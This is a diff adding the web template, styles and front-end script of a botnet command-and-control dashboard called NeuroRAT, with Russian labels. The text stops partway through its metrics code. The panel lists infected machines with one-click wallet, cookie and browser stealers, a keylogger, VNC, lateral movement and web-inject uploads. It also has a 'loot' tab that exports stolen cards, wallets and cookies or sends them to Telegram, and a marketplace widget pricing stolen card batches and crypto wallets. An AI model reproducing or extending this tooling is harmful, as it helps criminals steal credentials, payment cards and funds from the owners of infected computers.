@@ -1,0 +1,1165 @@
+{% extends "shared/base_layout.html" %}
+{% block title %}Advanced Dashboard | NeuroRAT{% endblock %}
+{% block content %}
+<style>
+body {
+    background: #181c24;
+    color: #e0e0e0;
+    font-family: 'Fira Mono', 'Consolas', monospace;
+}
+.advanced-dashboard {
+    max-width: 98vw;
+    margin: 0 auto;
+    padding: 2rem 1rem 1rem 1rem;
+}
+.tabs {
+    display: flex;
+    border-bottom: 2px solid #222;
+    margin-bottom: 1.5rem;
+}
+.tab {
+    padding: 1rem 2rem;
+    cursor: pointer;
+    background: none;
+    border: none;
+    color: #aaa;
+    font-size: 1.1rem;
+    transition: color 0.2s;
+    border-bottom: 3px solid transparent;
+}
+.tab.active {
+    color: #00ffe7;
+    border-bottom: 3px solid #00ffe7;
+    font-weight: bold;
+}
+.tab i { margin-right: 0.5em; }
+.tab-content { display: none; opacity: 0; transform: translateY(20px); transition: opacity 0.4s, transform 0.4s; }
+.tab-content.active { display: block; opacity: 1; transform: translateY(0); }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+.status-badge {
+    display: inline-block;
+    padding: 0.2em 0.7em;
+    border-radius: 1em;
+    font-size: 0.95em;
+    font-weight: bold;
+    background: #232b36;
+    color: #00ffe7;
+    margin-right: 0.5em;
+}
+.status-badge.inactive { color: #ff4e4e; background: #2a1a1a; }
+.status-badge.pending { color: #ffb300; background: #2a210a; }
+.table {
+    width: 100%;
+    border-collapse: collapse;
+    background: #232b36;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 2rem;
+}
+.table th, .table td {
+    padding: 0.7em 1em;
+    border-bottom: 1px solid #222;
+    text-align: left;
+}
+.table th {
+    background: #1a1e26;
+    color: #00ffe7;
+    font-weight: bold;
+}
+.table tr:last-child td { border-bottom: none; }
+.action-btn {
+    background: #00ffe7;
+    color: #181c24;
+    border: none;
+    border-radius: 4px;
+    padding: 0.4em 1em;
+    font-weight: bold;
+    cursor: pointer;
+    margin-right: 0.5em;
+    transition: background 0.2s, color 0.2s;
+}
+.action-btn:hover {
+    background: #00bfae;
+    color: #fff;
+}
+.filter-bar {
+    margin-bottom: 1em;
+    display: flex;
+    gap: 1em;
+    align-items: center;
+}
+input, select {
+    background: #232b36;
+    color: #e0e0e0;
+    border: 1px solid #333;
+    border-radius: 4px;
+    padding: 0.4em 0.8em;
+}
+::-webkit-scrollbar { width: 8px; background: #232b36; }
+::-webkit-scrollbar-thumb { background: #00ffe7; border-radius: 4px; }
+.card-metrics {
+    display: flex;
+    gap: 2em;
+    margin-bottom: 2em;
+}
+.metric-card {
+    background: #232b36;
+    border-radius: 8px;
+    padding: 1.2em 2em;
+    min-width: 180px;
+    text-align: center;
+    box-shadow: 0 2px 8px #0008;
+}
+.metric-card .value {
+    font-size: 2.2em;
+    color: #00ffe7;
+    font-weight: bold;
+}
+.metric-card .label {
+    color: #aaa;
+    font-size: 1em;
+    margin-top: 0.3em;
+}
+#ws-status {
+    position: fixed;
+    top: 18px;
+    right: 32px;
+    z-index: 9999;
+    font-weight: bold;
+    color: #00ffe7;
+    background: #181c24;
+    border-radius: 8px;
+    padding: 0.4em 1.2em;
+    box-shadow: 0 0 12px #00ffe7cc;
+    display: flex;
+    align-items: center;
+    gap: 0.6em;
+    transition: background 0.3s, color 0.3s, box-shadow 0.3s;
+}
+#ws-status.offline {
+    color: #ff4e4e;
+    background: #2a1a1a;
+    box-shadow: 0 0 12px #ff4e4ecc;
+}
+.ws-dot {
+    width: 12px; height: 12px; border-radius: 50%; background: #00ffe7; box-shadow: 0 0 8px #00ffe7cc; display: inline-block;
+    transition: background 0.3s, box-shadow 0.3s;
+}
+#ws-status.offline .ws-dot { background: #ff4e4e; box-shadow: 0 0 8px #ff4e4ecc; }
+
+/* Анимация появления новой строки */
+@keyframes glowIn { 0% { background: #00ffe733; } 100% { background: none; } }
+.new-row { animation: glowIn 2s ease-out; }
+.theme-selector {
+    position: fixed; top: 18px; left: 32px; z-index: 9999;
+    background: #181c24; color: #00ffe7; border-radius: 8px; padding: 0.4em 1.2em;
+    box-shadow: 0 0 12px #00ffe7cc; font-weight: bold; display: flex; gap: 1em; align-items: center;
+}
+.theme-selector select { background: #232b36; color: #00ffe7; border: none; border-radius: 4px; padding: 0.2em 0.8em; }
+#panic-btn {
+    position: fixed; top: 18px; left: 220px; z-index: 9999;
+    background: #ff4e4e; color: #fff; border-radius: 8px; padding: 0.4em 1.2em; font-weight: bold;
+    box-shadow: 0 0 16px #ff4e4ecc; border: none; cursor: pointer; transition: background 0.2s;
+}
+#panic-btn:hover { background: #b30000; }
+.marketplace-widget {
+    background:#181c24;border-radius:12px;box-shadow:0 0 24px #ffe70099,0 2px 8px #0008;padding:1.2em 2em;min-width:320px;margin-bottom:2em;
+    animation: glowIn 2s infinite alternate;
+}
+.marketplace-widget h3 { color:#ffe700; margin-bottom:0.5em; }
+.marketplace-widget ul { list-style:none; padding:0; margin:0; }
+.marketplace-widget li { color:#fff; margin-bottom:0.3em; }
+body.theme-neon { background: #0f0c29; color: #00ffe7; }
+body.theme-matrix { background: #0f0; color: #222; }
+body.theme-matrix .advanced-dashboard { background: #000; color: #0f0; }
+body.theme-matrix .table, body.theme-matrix .widget { background: #111; color: #0f0; }
+body.theme-matrix .action-btn { background: #0f0; color: #000; }
+body.theme-matrix .action-btn:hover { background: #00ffe7; color: #000; }
+@media (max-width: 900px) {
+    .card-metrics, .metrics-widgets, .tabs, .advanced-dashboard { flex-direction: column !important; gap: 1em !important; }
+    .metric-card, .widget, .marketplace-widget { min-width: 90vw !important; }
+    .tabs { flex-wrap: wrap; }
+}
+.table tbody:empty::after {
+    content: 'Нет данных'; display: block; text-align: center; color: #888; padding: 2em 0; font-size: 1.2em;
+}
+</style>
+<div class="theme-selector">
+    <span>Тема:</span>
+    <select id="theme-select">
+        <option value="">Dark</option>
+        <option value="neon">Neon</option>
+        <option value="matrix">Matrix</option>
+    </select>
+</div>
+<button id="panic-btn"><i class="fa-solid fa-skull-crossbones"></i> Panic mode</button>
+<div class="advanced-dashboard">
+    <h1><i class="fa-solid fa-brain-circuit"></i> Advanced Botnet Dashboard</h1>
+    <div class="card-metrics">
+        <div class="metric-card">
+            <div class="value">{{ metrics.total_agents }}</div>
+            <div class="label">Всего агентов</div>
+        </div>
+        <div class="metric-card">
+            <div class="value">{{ metrics.active_agents }}</div>
+            <div class="label">Онлайн</div>
+        </div>
+        <div class="metric-card">
+            <div class="value">{{ metrics.total_logs }}</div>
+            <div class="label">Логов</div>
+        </div>
+        <div class="metric-card">
+            <div class="value">{{ metrics.total_files }}</div>
+            <div class="label">Файлов</div>
+        </div>
+    </div>
+    <div class="tabs">
+        <button class="tab active" data-tab="agents"><i class="fa-solid fa-users"></i> Агенты</button>
+        <button class="tab" data-tab="logs"><i class="fa-solid fa-scroll"></i> Логи</button>
+        <button class="tab" data-tab="files"><i class="fa-solid fa-folder-open"></i> Файлы</button>
+        <button class="tab" data-tab="loot"><i class="fa-solid fa-vault"></i> Лут</button>
+        <button class="tab" data-tab="injects"><i class="fa-solid fa-syringe"></i> Web-injects</button>
+        <button class="tab" data-tab="metrics"><i class="fa-solid fa-chart-line"></i> Метрики</button>
+        <button class="tab" data-tab="ai"><i class="fa-solid fa-brain"></i> AI Decisions</button>
+        <button class="tab" data-tab="control"><i class="fa-solid fa-terminal"></i> Управление</button>
+    </div>
+    <div class="tab-content active" id="tab-agents">
+        <div class="filter-bar">
+            <input type="text" id="agent-search" placeholder="Поиск по агенту, IP, хосту...">
+            <select id="agent-status-filter">
+                <option value="">Все статусы</option>
+                <option value="active">Онлайн</option>
+                <option value="inactive">Оффлайн</option>
+                <option value="pending">Ожидание</option>
+            </select>
+        </div>
+        <table class="table" id="agents-table">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>OS</th>
+                    <th>Host</th>
+                    <th>User</th>
+                    <th>IP</th>
+                    <th>Статус</th>
+                    <th>Действия</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for agent in agents %}
+                <tr>
+                    <td>{{ agent.agent_id }}</td>
+                    <td>{{ agent.os }}</td>
+                    <td>{{ agent.hostname }}</td>
+                    <td>{{ agent.username }}</td>
+                    <td>{{ agent.ip_address }}</td>
+                    <td>
+                        <span class="status-badge {% if agent.status == 'active' %}active{% elif agent.status == 'inactive' %}inactive{% else %}pending{% endif %}">
+                            {{ agent.status|capitalize }}
+                        </span>
+                    </td>
+                    <td>
+                        <button class="action-btn" title="Открыть чат"><i class="fa-solid fa-comments"></i></button>
+                        <button class="action-btn" title="VNC"><i class="fa-solid fa-desktop"></i></button>
+                        <button class="action-btn" title="Скриншот"><i class="fa-solid fa-image"></i></button>
+                        <button class="action-btn" title="Файлы"><i class="fa-solid fa-folder"></i></button>
+                        <button class="action-btn" onclick="showReasoningModal('{{ agent.agent_id }}')">
+                            <i class="fa-solid fa-brain"></i> Reasoning
+                        </button>
+                        <button class="action-btn" title="Wallet Stealer" onclick="runAgentModule('{{ agent.agent_id }}','wallets')"><i class="fa-solid fa-wallet"></i></button>
+                        <button class="action-btn" title="Cookie Stealer" onclick="runAgentModule('{{ agent.agent_id }}','cookies')"><i class="fa-solid fa-cookie-bite"></i></button>
+                        <button class="action-btn" title="Browser Stealer" onclick="runAgentModule('{{ agent.agent_id }}','browser')"><i class="fa-solid fa-globe"></i></button>
+                        <button class="action-btn" title="System Info" onclick="runAgentModule('{{ agent.agent_id }}','system')"><i class="fa-solid fa-microchip"></i></button>
+                        <button class="action-btn" title="Keylogger" onclick="runAgentModule('{{ agent.agent_id }}','keylogger')"><i class="fa-solid fa-keyboard"></i></button>
+                        <button class="action-btn" title="VNC" onclick="runAgentModule('{{ agent.agent_id }}','vnc')"><i class="fa-solid fa-desktop"></i></button>
+                        <button class="action-btn" title="ATS (заглушка)" onclick="runAgentModule('{{ agent.agent_id }}','ats')"><i class="fa-solid fa-robot"></i></button>
+                        <button class="action-btn" title="Lateral Movement (заглушка)" onclick="runAgentModule('{{ agent.agent_id }}','lateral')"><i class="fa-solid fa-network-wired"></i></button>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    <div class="tab-content" id="tab-logs">
+        <div class="filter-bar">
+            <input type="text" id="log-search" placeholder="Поиск по логам...">
+            <select id="log-type-filter">
+                <option value="">Все типы</option>
+                <option value="command">Команды</option>
+                <option value="response">Ответы</option>
+                <option value="connection">Подключения</option>
+                <option value="terminate">Завершения</option>
+                <option value="build">Сборка</option>
+            </select>
+        </div>
+        <table class="table" id="logs-table">
+            <thead>
+                <tr>
+                    <th>Время</th>
+                    <th>Агент</th>
+                    <th>Тип</th>
+                    <th>Детали</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for log in logs %}
+                <tr>
+                    <td>{{ log.timestamp | datetimeformat }}</td>
+                    <td>{{ log.agent_id }}</td>
+                    <td>{{ log.event_type }}</td>
+                    <td>{{ log.details }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    <div class="tab-content" id="tab-files">
+        <div class="filter-bar">
+            <input type="text" id="file-search" placeholder="Поиск по файлам...">
+            <button class="action-btn"><i class="fa-solid fa-download"></i> Скачать всё</button>
+            <button class="action-btn"><i class="fa-solid fa-trash"></i> Удалить выбранные</button>
+            <input type="file" id="file-upload" multiple style="display:none;">
+            <button class="action-btn" onclick="document.getElementById('file-upload').click();"><i class="fa-solid fa-upload"></i> Загрузить</button>
+        </div>
+        <table class="table" id="files-table">
+            <thead>
+                <tr>
+                    <th><input type="checkbox" id="select-all-files"></th>
+                    <th>Имя файла</th>
+                    <th>Агент</th>
+                    <th>Размер</th>
+                    <th>Категория</th>
+                    <th>Время</th>
+                    <th>Действия</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for file in files %}
+                <tr>
+                    <td><input type="checkbox" class="file-checkbox"></td>
+                    <td>{{ file.name }}</td>
+                    <td>{{ file.agent_id }}</td>
+                    <td>{{ file.size }}</td>
+                    <td>{{ file.category }}</td>
+                    <td>{{ file.timestamp | datetimeformat }}</td>
+                    <td>
+                        <button class="action-btn" title="Скачать"><i class="fa-solid fa-download"></i></button>
+                        <button class="action-btn" title="Удалить"><i class="fa-solid fa-trash"></i></button>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    <div class="tab-content" id="tab-loot">
+        <div class="filter-bar">
+            <input type="text" id="loot-search" placeholder="Поиск по луту (карта, кошелек, cookie, агент, тег)...">
+            <select id="loot-type-filter">
+                <option value="">Все типы</option>
+                <option value="card">Карты</option>
+                <option value="wallet">Кошельки</option>
+                <option value="cookie">Cookies</option>
+            </select>
+            <button class="action-btn" id="loot-collect-all"><i class="fa-solid fa-magnet"></i> Собрать всё</button>
+            <button class="action-btn" id="loot-export-csv"><i class="fa-solid fa-file-csv"></i> Экспорт CSV</button>
+            <button class="action-btn" id="loot-export-json"><i class="fa-solid fa-file-code"></i> Экспорт JSON</button>
+            <button class="action-btn" id="loot-export-txt"><i class="fa-solid fa-file-lines"></i> Экспорт TXT</button>
+            <button class="action-btn" id="loot-send-telegram"><i class="fa-brands fa-telegram"></i> В Telegram</button>
+        </div>
+        <table class="table" id="loot-table">
+            <thead>
+                <tr>
+                    <th>Тип</th>
+                    <th>Значение</th>
+                    <th>Агент</th>
+                    <th>Время</th>
+                    <th>Теги</th>
+                    <th>Заметки</th>
+                    <th>Действия</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
+    <div class="tab-content" id="tab-injects">
+        <div class="filter-bar">
+            <input type="file" id="inject-upload" style="display:none;">
+            <button class="action-btn" onclick="document.getElementById('inject-upload').click();"><i class="fa-solid fa-upload"></i> Загрузить инъекцию</button>
+        </div>
+        <table class="table" id="injects-table">
+            <thead>
+                <tr>
+                    <th>Имя</th>
+                    <th>Загружено</th>
+                    <th>Статус</th>
+                    <th>Статистика</th>
+                    <th>Действия</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
+    <div class="tab-content" id="tab-metrics">
+        <div class="metrics-widgets" style="display:flex;gap:2em;flex-wrap:wrap;margin-bottom:2em;">
+            <div class="widget" id="widget-top-agents" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
+                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">Топ-5 агентов по файлам</div>
+                <ul id="top-agents-list" style="list-style:none;padding:0;margin:0;"></ul>
+            </div>
+            <div class="widget" id="widget-modules" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
+                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">Статус модулей</div>
+                <ul id="modules-status-list" style="list-style:none;padding:0;margin:0;"></ul>
+            </div>
+            <div class="widget" id="widget-attacks" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #ff00e799,0 2px 8px #0008;padding:1.2em 2em;min-width:260px;">
+                <div style="font-weight:bold;color:#ff00e7;font-size:1.1em;margin-bottom:0.5em;">Активные атаки</div>
+                <ul id="active-attacks-list" style="list-style:none;padding:0;margin:0;"></ul>
+            </div>
+            <div class="widget" id="widget-minimap" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:260px;">
+                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">Мини-карта (демо)</div>
+                <canvas id="minimap-canvas" width="200" height="120" style="background:#232b36;border-radius:8px;"></canvas>
+            </div>
+        </div>
+        <div style="display:flex;gap:2em;flex-wrap:wrap;align-items:flex-start;">
+            <div style="flex:1;min-width:320px;">
+                <canvas id="metrics-pie" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
+            </div>
+            <div style="flex:1;min-width:320px;">
+                <canvas id="metrics-bar" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #ff00e799;"></canvas>
+            </div>
+            <div style="flex:1;min-width:320px;">
+                <canvas id="metrics-radial" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
+            </div>
+        </div>
+    </div>
+    <div class="tab-content" id="tab-ai">
+        <div class="metrics-widgets" style="display:flex;gap:2em;flex-wrap:wrap;margin-bottom:2em;">
+            <div class="widget" id="widget-top-loot-agents" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #ffe70099,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
+                <div style="font-weight:bold;color:#ffe700;font-size:1.1em;margin-bottom:0.5em;">Топ-агенты по луту</div>
+                <ul id="top-loot-agents-list" style="list-style:none;padding:0;margin:0;"></ul>
+            </div>
+            <div class="widget" id="widget-fresh-cards" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
+                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">Свежие карты</div>
+                <ul id="fresh-cards-list" style="list-style:none;padding:0;margin:0;"></ul>
+            </div>
+            <div class="widget" id="widget-fresh-wallets" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ff6a99,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
+                <div style="font-weight:bold;color:#00ff6a;font-size:1.1em;margin-bottom:0.5em;">Свежие кошельки</div>
+                <ul id="fresh-wallets-list" style="list-style:none;padding:0;margin:0;"></ul>
+            </div>
+        </div>
+        <div style="display:flex;gap:2em;flex-wrap:wrap;align-items:flex-start;">
+            <div style="flex:1;min-width:320px;">
+                <canvas id="metrics-pie" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
+            </div>
+            <div style="flex:1;min-width:320px;">
+                <canvas id="metrics-bar" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #ff00e799;"></canvas>
+            </div>
+            <div style="flex:1;min-width:320px;">
+                <canvas id="metrics-radial" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
+            </div>
+        </div>
+    </div>
+    <div class="tab-content" id="tab-control">
+        <div style="margin-bottom:2em;">(Массовые действия: запуск модулей, удаление, активация VNC, keylogger, screenshot и т.д.)</div>
+        <button class="action-btn"><i class="fa-solid fa-desktop"></i> Активировать VNC на всех</button>
+        <button class="action-btn"><i class="fa-solid fa-keyboard"></i> Включить кейлоггер</button>
+        <button class="action-btn"><i class="fa-solid fa-image"></i> Сделать скриншоты</button>
+        <button class="action-btn"><i class="fa-solid fa-bug"></i> Инъекция</button>
+    </div>
+</div>
+<div id="ws-status"><span class="ws-dot"></span> LIVE</div>
+<!-- Marketplace widget (демо) -->
+<div class="marketplace-widget">
+    <h3><i class="fa-solid fa-shop"></i> Marketplace (демо)</h3>
+    <ul>
+        <li>💳 10 карт (RU, BIN 4276) — <span style="color:#00ff6a;">$100</span></li>
+        <li>🪙 2 BTC-кошелька — <span style="color:#00ff6a;">$500</span></li>
+        <li>🍪 1000 cookies (Google, Facebook) — <span style="color:#00ff6a;">$50</span></li>
+        <li>💳 5 карт (UA, BIN 4149) — <span style="color:#00ff6a;">$60</span></li>
+        <li>🪙 1 ETH-кошелек — <span style="color:#00ff6a;">$200</span></li>
+    </ul>
+    <div style="margin-top:1em;"><button class="action-btn"><i class="fa-solid fa-cart-shopping"></i> Купить (заглушка)</button></div>
+</div>
+<!-- Модальное окно для reasoning -->
+<div id="reasoning-modal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center;">
+    <div style="background:#232b36; color:#e0e0e0; border-radius:12px; max-width:600px; width:90vw; padding:2em; box-shadow:0 0 32px #00ffe7cc; position:relative;">
+        <button onclick="closeReasoningModal()" style="position:absolute; top:1em; right:1em; background:none; border:none; color:#00ffe7; font-size:1.5em; cursor:pointer;">&times;</button>
+        <h2><i class="fa-solid fa-brain"></i> Reasoning & Рекомендации</h2>
+        <div id="reasoning-content">
+            <div style="text-align:center; color:#aaa;">Загрузка...</div>
+        </div>
+    </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script>
+// Вкладки
+const tabs = document.querySelectorAll('.tab');
+const tabContents = document.querySelectorAll('.tab-content');
+tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+        tabs.forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        tabContents.forEach(tc => tc.classList.remove('active'));
+        document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+        if(tab.dataset.tab === 'files') loadFiles();
+        if(tab.dataset.tab === 'logs') loadLogs();
+        if(tab.dataset.tab === 'metrics') loadMetrics();
+    });
+});
+
+// --- Файлы ---
+async function loadFiles() {
+    const search = document.getElementById('file-search').value;
+    const res = await fetch(`/api/files?search=${encodeURIComponent(search)}`);
+    const data = await res.json();
+    const tbody = document.querySelector('#files-table tbody');
+    tbody.innerHTML = '';
+    data.files.forEach(file => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td><input type='checkbox' class='file-checkbox' data-id='${file.file_id}'></td>
+            <td>${file.name}</td>
+            <td>${file.agent_id}</td>
+            <td>${file.size}</td>
+            <td>${file.category}</td>
+            <td>${formatTime(file.timestamp)}</td>
+            <td>
+                <button class='action-btn' title='Скачать' onclick='downloadFile("${file.file_id}")'><i class='fa-solid fa-download'></i></button>
+                <button class='action-btn' title='Удалить' onclick='deleteFiles(["${file.file_id}"])'><i class='fa-solid fa-trash'></i></button>
+            </td>
+        `;
+        tbody.appendChild(tr);
+    });
+    ensureTableNotEmpty('files-table');
+}
+window.loadFiles = loadFiles;
+
+async function downloadFile(file_id) {
+    window.open(`/api/files/download?file_id=${file_id}`, '_blank');
+}
+
+async function deleteFiles(file_ids) {
+    if(!confirm('Удалить выбранные файлы?')) return;
+    await fetch('/api/files/delete', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({file_ids})
+    });
+    showToast('Файлы удалены');
+    loadFiles();
+}
+
+// Массовое удаление
+const selectAllFiles = document.getElementById('select-all-files');
+if(selectAllFiles) {
+    selectAllFiles.addEventListener('change', () => {
+        document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = selectAllFiles.checked);
+    });
+}
+document.querySelector('#tab-files').addEventListener('click', e => {
+    if(e.target.closest('.action-btn') && e.target.closest('.action-btn').textContent.includes('Удалить')) {
+        const checked = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.dataset.id);
+        if(checked.length) deleteFiles(checked);
+    }
+    if(e.target.closest('.action-btn') && e.target.closest('.action-btn').textContent.includes('Скачать всё')) {
+        document.querySelectorAll('.file-checkbox').forEach(cb => downloadFile(cb.dataset.id));
+    }
+});
+document.getElementById('file-search').addEventListener('input', loadFiles);
+
+// Drag&Drop upload
+const fileUpload = document.getElementById('file-upload');
+fileUpload.addEventListener('change', async e => {
+    for(const file of e.target.files) {
+        const form = new FormData();
+        form.append('file', file);
+        // Определяем agent_id (выбранный агент или 'manual')
+        let agent_id = 'manual';
+        const agentSelect = document.getElementById('agent-search');
+        if(agentSelect && agentSelect.value) agent_id = agentSelect.value;
+        form.append('agent_id', agent_id);
+        form.append('category', 'other');
+        const res = await fetch('/api/files/upload', { method: 'POST', body: form });
+        if(res.ok) showToast('Файл загружен');
+        else showToast('Ошибка загрузки файла');
+    }
+    loadFiles();
+});
+
+// Drag&Drop на область таблицы файлов
+const filesTable = document.getElementById('files-table');
+filesTable.addEventListener('dragover', e => { e.preventDefault(); filesTable.style.background = '#222'; });
+filesTable.addEventListener('dragleave', e => { filesTable.style.background = ''; });
+filesTable.addEventListener('drop', async e => {
+    e.preventDefault();
+    filesTable.style.background = '';
+    const files = e.dataTransfer.files;
+    for(const file of files) {
+        const form = new FormData();
+        form.append('file', file);
+        let agent_id = 'manual';
+        const agentSelect = document.getElementById('agent-search');
+        if(agentSelect && agentSelect.value) agent_id = agentSelect.value;
+        form.append('agent_id', agent_id);
+        form.append('category', 'other');
+        const res = await fetch('/api/files/upload', { method: 'POST', body: form });
+        if(res.ok) showToast('Файл загружен');
+        else showToast('Ошибка загрузки файла');
+    }
+    loadFiles();
+});
+
+// --- Логи ---
+async function loadLogs() {
+    const search = document.getElementById('log-search').value;
+    const type = document.getElementById('log-type-filter').value;
+    const res = await fetch(`/api/logs?search=${encodeURIComponent(search)}&type=${encodeURIComponent(type)}`);
+    const data = await res.json();
+    const tbody = document.querySelector('#logs-table tbody');
+    tbody.innerHTML = '';
+    data.logs.forEach(log => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td>${formatTime(log.timestamp)}</td>
+            <td>${log.agent_id || ''}</td>
+            <td>${log.event_type}</td>
+            <td>${log.details}</td>
+        `;
+        tbody.appendChild(tr);
+    });
+    ensureTableNotEmpty('logs-table');
+}
+document.getElementById('log-search').addEventListener('input', loadLogs);
+document.getElementById('log-type-filter').addEventListener('change', loadLogs);
+window.loadLogs = loadLogs;
+
+// --- Метрики ---
+let metricsChart = null, pieChart = null, barChart = null, radialChart = null;
+async function loadMetrics() {
+    const res = await fetch('/api/metrics');
+    const data = await res.json();
+    // Обновить карточки
+    document.querySelector('.metric-card .value').textContent = data.total_agents;
+    document.querySelectorAll('.metric-card .value')[1].textContent = data.active_agents;
+    document.querySelectorAll('.metric-card .value')[2].textContent = data.total_logs;
+    document.querySelectorAll('.metric-card .value')[3].textContent = data.total_files;
+    // --- Pie/Doughnut по категориям файлов ---
+    const pieCtx = document.getElementById('metrics-pie').getContext('2d');
+    if(pieChart) pieChart.destroy();
+    pieChart = new Chart(pieCtx, {
+        type: 'doughnut',
+        data: {
+            labels: Object.keys(data.files_by_category),
+            datasets: [{
+                data: Object.values(data.files_by_category),
+                backgroundColor: [
+                    '#00ffe7','#ff00e7','#ffe700','#00ff6a','#ff4e4e'
+                ],
+                borderWidth: 2,
+                borderColor: '#181c24',
+                hoverOffset: 16
+            }]
+        },
+        options: {
+            plugins: {
+                legend: { labels: { color: '#00ffe7', font: {weight:'bold'} } },
+                tooltip: { enabled: true }
+            },
+            animation: { animateRotate: true, animateScale: true },
+            cutout: '60%'
+        }
+    });
+    // --- Bar по категориям файлов ---
+    const barCtx = document.getElementById('metrics-bar').getContext('2d');
+    if(barChart) barChart.destroy();
+    barChart = new Chart(barCtx, {
+        type: 'bar',
+        data: {
+            labels: Object.keys(data.files_by_category),
+            datasets: [{
+                label: 'Файлы по категориям',
+                data: Object.values(data.files_by_category),
+                backgroundColor: [
+                    '#00ffe7','#ff00e7','#ffe700','#00ff6a','#ff4e4e'
+                ],
+                borderRadius: 8,
+                borderSkipped: false
+            }]
+        },
+        options: {
+            plugins: { legend: { display: false } },
+            scales: {
+                x: { ticks: { color: '#00ffe7', font:{weight:'bold'} } },
+                y: { ticks: { color: '#00ffe7', font:{weight:'bold'} }, beginAtZero:true }
+            },
+            animation: { duration: 1200, easing: 'easeOutElastic' }
+        }
+    });
+    // --- Radial (progress) по активным агентам ---
+    const radialCtx = document.getElementById('metrics-radial').getContext('2d');
+    if(radialChart) radialChart.destroy();
+    radialChart = new Chart(radialCtx, {
+        type: 'doughnut',
+        data: {
+            labels: ['Онлайн', 'Оффлайн'],
+            datasets: [{
+                data: [data.active_agents, data.total_agents-data.active_agents],
+                backgroundColor: ['#00ffe7','#232b36'],
+                borderWidth: 2,
+                borderColor: '#181c24',
+                hoverOffset: 12
+            }]
+        },
+        options: {
+            plugins: {
+                legend: { display: false },
+                tooltip: { enabled: true }
+            },
+            cutout: '80%',
+            animation: { animateRotate: true, animateScale: true }
+        }
+    });
+    // --- Топ-агенты ---
+    const topList = document.getElementById('top-agents-list');
+    topList.innerHTML = '';
+    data.top_agents.forEach(a => {
+        const li = document.createElement('li');
+        li.innerHTML = `<span style='color:#00ffe7;font-weight:bold;'>${a.agent_id}</span> <span style='color:#aaa;'>(${a.files} файлов)</span>`;
+        topList.appendChild(li);
+    });
+    // --- Статус модулей ---
+    const modulesList = document.getElementById('modules-status-list');
+    modulesList.innerHTML = '';
+    Object.entries(data.modules_status).forEach(([mod, status]) => {
+        const color = status==='online' ? '#00ff6a' : '#ff4e4e';
+        const glow = status==='online' ? '0 0 12px #00ff6a' : '0 0 12px #ff4e4e';
+        const icon = mod==='VNC' ? 'fa-desktop' : (mod==='Keylogger' ? 'fa-keyboard' : 'fa-image');
+        modulesList.innerHTML += `<li style='margin-bottom:0.3em;'><i class='fa-solid ${icon}' style='color:${color};filter:drop-shadow(${glow});margin-right:0.5em;'></i><span style='color:${color};font-weight:bold;text-shadow:${glow};'>${mod}</span> <span style='color:#aaa;'>${status}</span></li>`;
+    });
+    // --- Активные атаки ---
+    const attacksList = document.getElementById('active-attacks-list');
+    attacksList.innerHTML = '';
+    data.active_attacks.forEach(a => {
+        const color = a.status==='running' ? '#ffe700' : '#00ff6a';
+        attacksList.innerHTML += `<li style='margin-bottom:0.3em;'><i class='fa-solid fa-bolt' style='color:${color};margin-right:0.5em;'></i><span style='color:${color};font-weight:bold;'>${a.type}</span> <span style='color:#aaa;'>на</span> <span style='color:#00ffe7;'>${a.target}</span> <span style='color:#aaa;'>[${a.status}]</span></li>`;
+    });
+    // --- Мини-карта (демо, случайные точки) ---
+    const minimap = document.getElementById('minimap-canvas');
+    const ctx = minimap.getContext('2d');
+    ctx.clearRect(0,0,200,120);
